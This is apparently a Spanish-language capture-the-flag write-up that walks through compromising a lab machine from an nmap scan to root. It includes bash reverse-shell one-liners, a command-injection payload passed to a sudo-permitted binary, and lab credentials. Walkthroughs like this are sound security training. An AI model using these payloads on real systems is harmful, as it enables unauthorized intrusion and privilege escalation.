


# Esacaneo de puertos y servicios
```bash
nmap -p- -Pn -sVCS --min-rate 5000 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 16:42 EDT
Nmap scan report for info.404-not-found.hl (172.17.0.2)
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Security Verification Tool
|_http-server-header: Apache/2.4.58 (Ubuntu)
7777/tcp open  http    SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
|_http-title: Directory listing for /
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

veremos el servicio http abierto con dos puertos diferentes iremos a la web y veremos lo siguiente  

<img width="1279" height="758" alt="image" src="https://github.com/user-attachments/assets/7fe624b1-5821-439c-8112-4a2e207392bd" />

Realizamos un escaneo de subdirectorios, pero no encontramos nada. 

<img width="999" height="364" alt="image" src="https://github.com/user-attachments/assets/ef49c245-978b-4054-8dcc-c1a2d793aae1" />


Nos iremos al puerto 7777 que nos mostraba en el escaneo anteriormente veremos lo siguiente 

<img width="900" height="365" alt="image" src="https://github.com/user-attachments/assets/a616c174-9d17-4bee-ad5c-c6692f618815" />

Abrimos el .ssh y observamos un id_rsa. Pero ambos están vacíos.

<img width="620" height="215" alt="image" src="https://github.com/user-attachments/assets/b8775979-b358-4bd6-8c32-4ba2166cd510" />

Abrimos nota.txt y observamos lo siguiente.

<img width="362" height="101" alt="image" src="https://github.com/user-attachments/assets/4b1504c6-8a22-4016-b4e1-6df468734084" />

Vamos a secret y luego seleccionamos el archivo que tiene dentro, podemos observar que tiene un texto bastante interesante.

<img width="1279" height="449" alt="image" src="https://github.com/user-attachments/assets/d2ed037e-eebf-4af8-aa39-ca584964ff75" />

Leyendo un poco veremos un texto interesante 

<img width="238" height="77" alt="image" src="https://github.com/user-attachments/assets/2603e33c-1ed9-4a44-801b-5133a87bef06" />

```bash
super_secure_password
```

ingresaremos esto en la pagina principal que nos redirige con exito y veremos lo siguiente 

<img width="996" height="823" alt="image" src="https://github.com/user-attachments/assets/ada5ff3b-1e41-43ee-8204-35d582d3f0b5" />

aremos un texto de prueba 


<img width="578" height="512" alt="image" src="https://github.com/user-attachments/assets/06070957-abd5-49f4-b0e0-1fe8d1c940c9" />

Vamos al puerto 7777 podemos observar que el archivo se guarda en esta carpeta.

<img width="467" height="319" alt="image" src="https://github.com/user-attachments/assets/4f0f5309-3126-49c4-9438-ce40c31376f0" />

Probaremos establecer una shell por este medio, para ello crearemos un archivo

```bash
bash -i >& /dev/tcp/ip/port 0>&1
```

<img width="524" height="440" alt="image" src="https://github.com/user-attachments/assets/501a78ef-cd06-4575-901d-6736eb8520c9" />

nos pondremos en escucha con nc  

```bash
nc -lvnp port
```

Ingresamos el nombre del archivo y le damos en fetch configuration

<img width="505" height="213" alt="image" src="https://github.com/user-attachments/assets/dc367dc5-01a1-44b9-8180-4864d58f7ee7" />

Vamos a nuestro listener y podemos observar que ya obtuvimos acceso.

<img width="637" height="96" alt="image" src="https://github.com/user-attachments/assets/0a11eb9d-cba6-4a9d-bc68-f88866d53b63" />

Aremos un tratamiento de tty
```bash
script /dev/null -c bash
stty raw -echo; fg
                reset xterm
export TERM=xterm
echo $SHELL
export SHELL=/bin/bash
stty rows 59 cols 236
```

de esta manera ya nos podemos mover con más libertad en la consola.

Tratamos de realizar un sudo -l, pero no es posible, ya que necesitamos un password.

<img width="608" height="68" alt="image" src="https://github.com/user-attachments/assets/d5d2b7c1-bf1b-460b-9d10-b829077e535f" />

Vamos a la carpeta home y de las dos carpetas que existen solo podemos acceder a la de codebad.

<img width="366" height="70" alt="image" src="https://github.com/user-attachments/assets/68b00875-0410-409f-8113-db6827e47dc8" />

Al ingresar observamos 2 archivos de los cuales secret es una carpeta y tiene el siguiente texto y pensando un poco entendemos que se refiere a un malware.

<img width="539" height="295" alt="image" src="https://github.com/user-attachments/assets/19e592fb-887d-4dfe-89d0-e1fe0a556a0c" />


```bash
codebad:malware
```

<img width="491" height="93" alt="image" src="https://github.com/user-attachments/assets/1936636a-f909-4645-bb6d-230a63a5e61b" />

Realizamos un sudo -l y se puede observar la manera de escalar, la cual es haciendo uso del otro archivo que vimos en el directorio de este usuario.

<img width="540" height="109" alt="image" src="https://github.com/user-attachments/assets/f8dd8b53-ce3a-4951-91be-8c11c2452b21" />

Probamos ejecutando el comando y podemos observar que necesita un parámetro y también que hace uso del binario ls.


<img width="592" height="83" alt="image" src="https://github.com/user-attachments/assets/d1bf4f5a-f1e9-473a-96fd-5492c7885261" />

Listamos el directorio de metadata y observamos 2 archivos, tratamos de leerlos, pero no es posible.

<img width="736" height="90" alt="image" src="https://github.com/user-attachments/assets/d6ef9a23-f09f-4586-9eb1-866b7682fe87" />

Después de probar varias veces podemos observar que podemos leer el archivo si le agregamos comillas, pero no podemos leer el archivo pass.txt y el archivo user.txt se puede considerar como el flag de cierta manera así que no tiene sentido probar romperla.

<img width="735" height="75" alt="image" src="https://github.com/user-attachments/assets/ff044525-57ac-4093-976a-69f4216330c6" />

Como podemos agregar comandos luego de listar archivos, nos aprovecharemos de esta opción para poder obtener una shell.

Nos ponemos ala escucha con otra termianl 

```bash
nc -lvnp port 
```

Enviamos la shell.

```bash
sudo -u metadata /home/codebad/code "/home/metadata | bash -c '/bin/bash -i >& /dev/tcp/ip/port 0>&1 '"
```
<img width="730" height="78" alt="image" src="https://github.com/user-attachments/assets/3eae42d2-a3ba-4ea9-92a1-957130d0c11f" />

Después de varias pruebas obtuvimos conexión.

<img width="560" height="64" alt="image" src="https://github.com/user-attachments/assets/5b16111b-9876-4daf-84c8-2bccab628dc7" />

Volvemos a realizar el mismo tratamiento de la TTY como lo hicimos con la anterior Shell.

Buscamos permisos SUID y capabilities, pero no observamos algo que sea útil.

<img width="547" height="198" alt="image" src="https://github.com/user-attachments/assets/ee71ca37-c8d2-4291-a012-7e320bb13237" />

Realizamos una búsqueda de archivos para metadata y encontramos varias carpetas.

<img width="535" height="277" alt="image" src="https://github.com/user-attachments/assets/a8bac2bb-4d4d-4627-8c85-6d92830884dc" />

Ingresamos al directorio /usr/local/bin y podemos observar que hay un archivo llamado metadatosmalos y al abrirlo observamos lo siguiente.

<img width="585" height="276" alt="image" src="https://github.com/user-attachments/assets/7411ad95-d889-4961-a5df-90bdddce0115" />

Observando lo que se ejecutaría notamos que no tiene ningún sentido, ya que al realizar un whoami el usuario no tiene la palabra pass.txt. Probamos un sudo -l y el nombre del archivo como password y observamos que si le corresponde, así también podemos ver la manera de escalar como root.

```bash
metadata:metadatosmalos
```

<img width="731" height="87" alt="image" src="https://github.com/user-attachments/assets/983685d2-a874-49da-bb95-5b33751ec039" />


Para este binario vamos a la página de GTFOBins y vemos que comando usar para escalar. 


<img width="752" height="170" alt="image" src="https://github.com/user-attachments/assets/d5f3fdfe-915d-429b-9418-64520c620c1a" />


Ingresamos los comandos y podemos observar que obtuvimos acceso como root. De esta manera culminando esta máquina.



<img width="651" height="73" alt="image" src="https://github.com/user-attachments/assets/def2a54f-3f8e-4454-a231-4a12703e5e62" />
